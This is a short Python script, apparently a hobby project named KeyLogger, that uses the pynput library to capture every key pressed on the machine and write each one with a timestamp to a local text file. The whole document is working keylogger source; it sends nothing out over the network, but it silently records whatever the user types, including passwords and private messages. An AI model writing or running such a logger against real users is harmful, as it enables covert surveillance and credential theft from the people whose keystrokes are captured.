
from pynput.keyboard import Listener
import logging

log_dir = r"E:/Codes/KeyLogger/"
logging.basicConfig(filename=(log_dir + "keyLogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
